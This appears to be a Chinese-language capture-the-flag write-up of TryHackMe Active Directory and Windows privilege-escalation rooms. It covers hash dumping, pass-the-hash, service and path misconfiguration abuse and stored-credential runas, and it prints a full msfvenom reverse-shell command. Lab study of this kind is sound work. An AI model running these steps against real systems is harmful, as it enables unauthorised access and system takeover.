01:远程抓hash

来源:Try Hack Me

房间链接: https://tryhackme.com/room/attacktivedirectory

所需条件:知道backup账号密码或一个域内用户的正常账号密码

所需工具: Kali下自带的secretdump + evil-winrm

















Secretdump可以远程导出目标主机上存放的hash如果运气号可以拿到admin的账号密码信息。这种方法适用于内网摸鱼攻击使用。
















然后使用另外一个工具evil-winrm 指定IP和用户名可通过hash摸鱼登录。登录成功

02:权限过高的应用


来源:Try Hack Me

房间链接: https://tryhackme.com/room/windows10privesc

所需条件:获得一个普通账号和能够远程登录

















该漏洞其实是跟雷蛇的那个漏洞差不多的只需要简单几步即可。

在以一个普通账号远程登录以后打开CMD输入以下命令后可以看到权限是admin高到惊人

命令:tasklist /v | findstr paint.exe

Tasklist /v=列出详细信息

Findstr=查找 一个或多个文件

















然后就打开该应用选择打开功能

















这里直接在上面转到cmd的位置去

















此时会跳出一个信的CMD窗口目前就是从普通用户升级到admin了。


03:弱服务权限daclsvc提权


这波是炒冷饭之前已经发过一次了如果看过这个可以选择跳过，daclsvc是服务权限正常来讲每个服务都会在windows上也有一个binary path提供具体的程序指向。如果普通用户对于某个服务权限过高可以来波提权。

所需条件:一个正常的普通用户+可以远程登录(非必要,远程shell也可)

所需工具:微软的accesschk.exe + msfvenom制造的反弹shell

来源: Try Hack Me

房间链接: https://tryhackme.com/room/windows10privesc

















首先是利用msfvenom快速制作一个反弹shell

命令:msfvenom -p windows/x64/shell_reverse_tcp LHOST=本地IP LPORT=任意端口 -f exe -o reverseshell.exe

















然后通过各种奇奇怪怪的方法传过去(可参考附录3里面有提及这里就不细说了),之后就开始用微软的accesschk.exe,它可以用来检测一下当前用户user的权限有些啥,这里看到可以对service change config改一波设定。

















接着就使用sc qc 查看服务信息可以看到daclsvc有一个binarypath指向具体的可执行文件。同时可以看到SERVICE_START_NAME那里写的是LocalSystem代表的是具备系统的权限。

















既然前面知道目前user可以更改跟admin一样有权力更改系统配置的话我们可以把传过来的反弹shell给代替这个daclservice然后重新启动服务获取一个反弹shell权限。

















最后提前开启nc用net start daclsvc重新启动服务的话会获得一个系统shell，毕竟是系统运行的也是系统送过来的


04:未带引号路径提权


所需条件:一个正常的普通用户+可以远程登录(非必要,远程shell也可)

所需工具:微软的accesschk.exe + msfvenom制造的反弹shell

来源: Try Hack Me

房间链接: https://tryhackme.com/room/windows10privesc

















炒冷饭+2，如果之前看过的也可以继续跳过了。

在正常情况下，如果Windows启动了某个服务，Windows会自动搜索它的二进制文件(BINARY_PATH_NAME)来运行。当运行服务时,如果给出了可执行文件+完整路径如下图所示,这种有引号括起来的完整路径，系统会按照位置执行。

















与之相比如果服务的二进制路径没有引号的话，系统会执行找到的空格分隔的服务路径的第一个实例。

















当然上面这个例子其实不太好这里引用了https://blog.csdn.net/weixin_44032232/article/details/109073666 这位大佬的解释


比如说现在有个服务的路径是c:\program files (x86)\grasssoft\macro expert\MacroService.exe


那么会根据以下顺序依次读取(有空格就停止一次)

1.c:\program.exe

2.c:\program files.exe

3.c:\program file (x86)\grasssoft\macro.exe

4.c:\program files (x86)\grasssoft\macro expert\MacroService.exe


假如说目前的user具有一定权限修改路径的话可以在系统读取程序的路上塞一个恶意文件反弹shell进去然后让系统发一个shell给攻击机。首先使用sc qc找到它的加载程序路径也可以看到运行的是系统权限

















找到以后最好用accesschk.exe程序对它的路径做一个权限检测目前我们的user具备读写权限

















确保前置条件都满足以后可使用copy把之前我们存好的反弹shell复制到Unquoted Path Service下一个目录改成Common.exe没引号就会从Common Files检测是否包含Common.exe 复制完就使用net start重新启动一波服务
















记得提前开启nc会得到一个shell。


05:存储在Windows上的用户密码


来源: Try Hack Me

房间链接: https://tryhackme.com/room/windows10privesc


这个方法可能比较少见，并且全靠管理员抬一手才能出现这种情况。先介绍一下会用到的工具cmdkey。这个工具是Windows下会自带的，这个工具会缓存windows上或者域内的一些用户凭证。比如说现在输入cmdkey /list可以很幸运的看到有个admin的凭证

















既然有了admin的通行卡那我们可以借助runas命令来启动这个通行证。Runas可以使用存在的凭证去执行一些命令

















我们可以借助runas指定admin通行证然后运行反弹shell,相当于是一个admin发一个shell给攻击机。

















只需要提前开启nc即可。

09:弱文件夹权限


来源:Try Hack Me

房间链接: https://tryhackme.com/room/windows10privesc


这里会用到两个工具，PowerUp.ps1和accesschk.exe

由于该靶机已经提前帮我们准备好这两个文件了，如果是在实战中可以用上面的方法传输文件。这里先使用PowerUp.ps1

















先进入powershell模式，然后用.  .\PowerUp.ps1加载，最后用Invoke-AllChecks启动检测

















可以找到一个特别的服务叫filepermsvc(应该就是文件夹的权限),同时startName时LocalSystem具有更高的权限，我们的目标就是利用它。

















当然在利用前建议使用accesschk.exe看看目前用户是否具有执行权，否则就很尴尬了。这里可以看到目前用户user 具有RW权限即可读可写可更改

命令:accesschk.exe /accepteula(自动接收许可协议，记得一定加上去，否则想想会自动弹出一个是否接收许可协议，就很尴尬了)

-q=忽略banner

-u=忽略错误

-v=详细信息

-w=只显示拥有可写权的对象

后面的路径时根据PowerUp.ps1所提供的

















那我们的机会就来了，可以把前面的反弹shell,复制到服务的.exe里面去，顺便把它改名为filepermservice.exe 然后重新启动该服务，因为具有更高的权限，理论上来讲是会反弹一个更高权限的shell

















这里由于是靶机我直接在CMD下执行net start 重启命令，然后提前开启nc成功接收到一个更高权限的shell。
